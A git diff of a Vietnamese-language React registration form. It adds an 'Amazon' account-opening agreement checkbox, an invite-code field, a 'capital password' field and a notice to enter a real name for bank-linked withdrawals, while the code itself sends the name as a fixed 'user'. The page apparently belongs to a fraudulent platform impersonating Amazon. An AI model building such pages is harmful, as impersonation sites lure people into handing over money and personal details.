@@ -20,14 +20,21 @@ function Register(props: any) {
   const history = useHistory()
 
   const dispatch = useDispatch()
+  const [reading, setReading] = useState(false)
   const [isLoading, setLoading] = useState(false)
 
   const onFinish = async (values: any) => {
+    if (!reading) {
+      message.error(
+        'Vui lòng đọc và đồng ý với thoả thuận mở tài khoản của Amazon'
+      )
+      return
+    }
     try {
       setLoading(true)
       const resRegister = await requestSignin({
         identifier: values.identifier,
-        name: values.name,
+        name: 'user',
         phone: values.phone,
         password: values.password,
         tfa_password: values.tfa_pass,
@@ -42,7 +49,6 @@ function Register(props: any) {
         history.replace('/')
       }, 1000)
     } catch (error) {
-      console.log(error)
       setLoading(false)
     }
   }
@@ -51,12 +57,27 @@ function Register(props: any) {
     <div className="login">
       <img alt="" src={R.images.bg} className="login-bg" />
       <div className="container-login">
-        <img
-          className="login-logo"
-          width={150}
-          src={R.images.logo_web}
-          alt=""
-        />
+        <h1
+          style={{
+            textAlign: 'center',
+            color: 'white',
+            fontSize: 24,
+            fontWeight: 700,
+          }}
+        >
+          Đăng ký
+        </h1>
+        <p
+          style={{
+            textAlign: 'center',
+            color: 'white',
+            fontSize: 10,
+            marginBottom: 10,
+          }}
+        >
+          Lưu ý: Nhập đúng họ và tên thật để liên kết tài khoản ngân hàng và rút
+          tiền
+        </p>
         <Form
           form={form}
           layout={'vertical'}
@@ -74,7 +95,6 @@ function Register(props: any) {
         >
           <Form.Item
             name="name"
-            label={'Họ và tên'}
             rules={[
               { required: true, message: 'Không được bỏ trống' },
               // {
@@ -84,38 +104,32 @@ function Register(props: any) {
             ]}
           >
             <Input
-              prefix={<UserOutlined className="site-form-item-icon" />}
-              placeholder={'Họ và tên'}
+              style={{
+                borderRadius: '9999px',
+                height: 46,
+                fontSize: 16,
+                fontWeight: 300,
+                textAlign: 'center',
+              }}
+              placeholder={'Vui lòng nhập họ và tên thật'}
             />
           </Form.Item>{' '}
           <Form.Item
-            name="identifier"
-            label={'Tên đăng nhập'}
-            rules={[
-              { required: true, message: 'Không được bỏ trống' },
-              // {
-              //   pattern: REG_PHONE,
-              //   message: 'Số điện thoại không hợp lệ',
-              // },
-            ]}
-          >
-            <Input
-              prefix={<UserOutlined className="site-form-item-icon" />}
-              placeholder={'Tên đăng nhập'}
-            />
-          </Form.Item>
-          <Form.Item
             name="phone"
-            label={'Số điện thoại'}
             rules={[{ required: true, message: 'Không được bỏ trống' }]}
           >
             <Input
-              prefix={<UserOutlined className="site-form-item-icon" />}
-              placeholder={'Số điện thoại'}
+              style={{
+                borderRadius: '9999px',
+                height: 46,
+                fontSize: 16,
+                fontWeight: 300,
+                textAlign: 'center',
+              }}
+              placeholder={'Vui lòng nhập số điện thoại'}
             />
           </Form.Item>
           <Form.Item
-            label="Mật khẩu"
             name="password"
             rules={[
               { required: true, message: 'Không được bỏ trống' },
@@ -123,13 +137,21 @@ function Register(props: any) {
             ]}
           >
             <Input
-              prefix={<LockOutlined className="site-form-item-icon" />}
+              style={{
+                borderRadius: '9999px',
+                height: 46,
+                fontSize: 16,
+                fontWeight: 300,
+                textAlign: 'center',
+              }}
               type="password"
-              placeholder={R.strings().placeholder_password}
+              placeholder={`Vui lòng nhập ${R.strings().placeholder_password.replace(
+                'Mật khẩu',
+                'mật khẩu'
+              )}`}
             />
           </Form.Item>
           <Form.Item
-            label="Mật khẩu vốn"
             name="tfa_pass"
             rules={[
               { required: true, message: 'Không được bỏ trống' },
@@ -137,13 +159,18 @@ function Register(props: any) {
             ]}
           >
             <Input
-              prefix={<LockOutlined className="site-form-item-icon" />}
+              style={{
+                borderRadius: '9999px',
+                height: 46,
+                fontSize: 16,
+                fontWeight: 300,
+                textAlign: 'center',
+              }}
               type="password"
-              placeholder={'Mật khẩu vốn'}
+              placeholder={'Vui lòng nhập mật khẩu vốn'}
             />
           </Form.Item>
           <Form.Item
-            label="Mã mời"
             name="invite_code"
             rules={[
               { required: true, message: 'Không được bỏ trống' },
@@ -151,9 +178,29 @@ function Register(props: any) {
             ]}
           >
             <Input
-              prefix={<LockOutlined className="site-form-item-icon" />}
-              placeholder={'Mã mời'}
+              style={{
+                borderRadius: '9999px',
+                height: 46,
+                fontSize: 16,
+                fontWeight: 300,
+                textAlign: 'center',
+              }}
+              placeholder={'Vui lòng nhập mã mời'}
             />
+          </Form.Item>
+          <Form.Item
+            name="remember"
+            valuePropName="checked"
+            style={{
+              textAlign: 'center',
+            }}
+          >
+            <Checkbox
+              style={{ color: 'white' }}
+              onChange={e => setReading(e.target.checked)}
+            >
+              Tôi đã đọc và đồng ý với thoả thuận mở tài khoản của Amazon
+            </Checkbox>
           </Form.Item>
           <Form.Item
             style={{
@@ -167,17 +214,23 @@ function Register(props: any) {
               style={{
                 width: '100%',
                 height: 40,
+                fontSize: 18,
+                borderRadius: 25,
+                backgroundColor: 'red',
+                borderColor: 'red',
                 fontWeight: 700,
-                marginTop: 20,
               }}
             >
               Đăng ký
             </Button>
           </Form.Item>
+          {/* checkbox Lưu ý: Nhập đúng họ và tên thật để liên kết tài khoản ngân hàng và rút tiền  */}
         </Form>
         <p className="login-text__btm">
           Đã có tài khoản?{' '}
-          <a onClick={() => history.push('/login')}>Đăng nhập</a>
+          <a style={{ color: 'orange' }} onClick={() => history.push('/login')}>
+            Đăng nhập
+          </a>
         </p>
       </div>
       {/* {isLoading && <LoadingProgress />} */}
